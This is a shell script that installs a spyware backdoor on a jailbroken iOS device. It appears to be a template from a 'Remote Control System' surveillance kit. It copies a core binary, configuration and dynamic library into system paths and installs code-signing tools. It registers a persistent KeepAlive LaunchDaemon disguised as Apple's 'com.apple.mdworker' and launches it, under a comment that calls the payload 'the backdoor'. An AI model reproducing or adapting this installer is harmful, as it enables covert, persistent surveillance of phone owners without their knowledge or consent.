#!/bin/sh

# GLOBAL VARS
DIR=[:RCS_DIR:]
CORE=[:RCS_CORE:]
CONF=[:RCS_CONF:]
DYLIB=[:RCS_DYLIB:]
LOG=./install.log
BASE=/var/mobile
LAUNCHD_NAME=com.apple.mdworker
PLIST="<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n \
<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n \
<plist version=\"1.0\">\n \
<dict>\n \
	<key>Label</key>\n \
	<string>$LAUNCHD_NAME</string>\n \
	<key>KeepAlive</key>\n \
	<true/>\n \
	<key>ThrottleInterval</key>\n \
	<integer>3</integer> \n \
	<key>WorkingDirectory</key>\n \
	<string>$BASE/$DIR</string>\n \
	<key>ProgramArguments</key>\n \
	<array>\n \
		<string>$BASE/$DIR/$CORE</string>\n \
	</array>\n \
</dict>\n \
</plist>"

ENT_NAME=ent.plist

ENT_FILE="<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n \
<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n \
<plist version=\"1.0\"><dict><key>task_for_pid-allow</key><true/></dict></plist>"

#INFO
echo "**** installation script verions 1.3 ****" > $LOG
echo running installation... >> $LOG
echo Folder path     : "$BASE/$DIR" >> $LOG
echo Core name       : "$CORE" >> $LOG
echo Conf name       : "$CONF" >> $LOG
echo Dynamic lib name: "$DYLIB" >> $LOG
echo >> $LOG

# removing older folder
echo -n  $0: `date` - rm -rf  $BASE/$DIR >> $LOG
RET_VAL=`rm -rf $BASE/$DIR 2>&1`

if [ -d $BASE/$DIR ]
 then
  echo ... error: $RET_VAL. >> $LOG
  exit 1
 else
  echo ... done! >> $LOG
fi

# removing older dylib
echo -n  $0: `date` - rm -f  /usr/lib/$DYLIB >> $LOG
RET_VAL=`rm -f /usr/lib/$DYLIB 2>&1`

if [ -f /usr/lib/$DYLIB ]
 then
  echo ... error: $RET_VAL. >> $LOG
  exit 1
 else
  echo ... done! >> $LOG
fi

# create folder
echo -n  $0: `date` - mkdir $BASE/$DIR >> $LOG
RET_VAL=`mkdir $BASE/$DIR 2>&1`

if [ -d $BASE/$DIR ]
 then
  echo ... done! >> $LOG
 else
  echo ... error: $RET_VAL. >> $LOG
  exit 2
fi

# set attrib for tool
echo -n $0: `date` - chmod 755 ./codesign_allocate >> $LOG
RET=`chmod 755 ./codesign_allocate 2>&1`

if [ $? -eq 0 ]
 then
  echo ... done! >> $LOG
 else
  echo ... error: $RET_VAL.>> $LOG
  exit 7
fi

echo -n $0: `date` - chmod 755 ./ldid >> $LOG
RET=`chmod 755 ./ldid 2>&1`

if [ $? -eq 0 ]
 then
  echo ... done! >> $LOG
 else
  echo ... error: $RET_VAL.>> $LOG
  exit 7
fi

# moving codisign tool
echo -n $0: `date` - cp ./codesign_allocate /usr/bin/codesign_allocate >> $LOG
RET_VAL=`cp ./codesign_allocate /usr/bin/codesign_allocate 2>&1`

if [ -e /usr/bin/codesign_allocate ]
 then
  echo ... done! >> $LOG
 else
  echo ... error: $RET_VAL.>> $LOG
  exit 3
fi

# moving ldid tool
echo -n $0: `date` - cp ./ldid /usr/bin/ldid >> $LOG
RET_VAL=`cp ./ldid /usr/bin/ldid 2>&1`

if [ -e /usr/bin/ldid ]
 then
  echo ... done! >> $LOG
 else
  echo ... error: $RET_VAL.>> $LOG
  exit 4
fi

# moving components
echo -n $0: `date` - cp ./$CORE $BASE/$DIR/$CORE >> $LOG
RET_VAL=`cp ./$CORE $BASE/$DIR/$CORE 2>&1`

if [ -e $BASE/$DIR/$CORE ]
 then
  echo ... done! >> $LOG
 else
  echo ... error: $RET_VAL.>> $LOG
  exit 5
fi

echo -n $0: `date` - cp ./$CONF $BASE/$DIR/$CONF >> $LOG
RET_VAL=`cp ./$CONF $BASE/$DIR/$CONF 2>&1`

if [ -e $BASE/$DIR/$CONF ]
 then
  echo ... done! >> $LOG
 else
  echo ... error: $RET_VAL. >> $LOG
  exit 6
fi

echo -n $0: `date` - cp ./$DYLIB /usr/lib/$DYLIB >> $LOG
RET_VAL=`cp ./$DYLIB /usr/lib/$DYLIB 2>&1`

if [ -e /usr/lib/$DYLIB ]
 then
  echo ... done! >> $LOG
 else
  echo ... error: $RET_VAL. >> $LOG
  exit 6
fi

# set attrib
echo -n $0: `date` - chmod 755 $BASE/$DIR/$CORE >> $LOG
RET=`chmod 755 $BASE/$DIR/$CORE 2>&1`

if [ $? -eq 0 ]
 then
  echo ... done! >> $LOG
 else
  echo ... error: $RET_VAL.>> $LOG
  exit 7
fi

# write down the entitlements
# echo -e $ENT_FILE > ./$ENT_NAME

# rebuild the pseduo sig
# echo -n $0: `date` - ldid -S $BASE/$DIR/$CORE >> $LOG
# RET=`./ldid -S$ENT_NAME $BASE/$DIR/$CORE 2>&1`

#if [ $? -eq 0 ]
# then
#  echo ... done! >> $LOG
# else
#  echo ... error: $RET_VAL.>> $LOG
#  exit 8
#fi

# create launchd plist
echo -e $PLIST > /Library/LaunchDaemons/$LAUNCHD_NAME.plist

if [ -e /Library/LaunchDaemons/$LAUNCHD_NAME.plist ]
 then
  echo ... done! >> $LOG
 else
  echo ... error: $RET_VAL. >> $LOG
  exit 9
fi

# run the backdoor
echo -n $0: `date` - running $BASE/$DIR/$CORE >> $LOG
# (cd $BASE/$DIR; $BASE/$DIR/$CORE > /dev/null 2>&1 ) & 
/bin/launchctl load /Library/LaunchDaemons/$LAUNCHD_NAME.plist
echo ... done! >> $LOG

echo >> $LOG
echo "folder content: $BASE/$DIR" >> $LOG
echo >> $LOG
ls -la $BASE/$DIR >> $LOG

echo >> $LOG
echo $0: "installation done." >> $LOG

exit 0
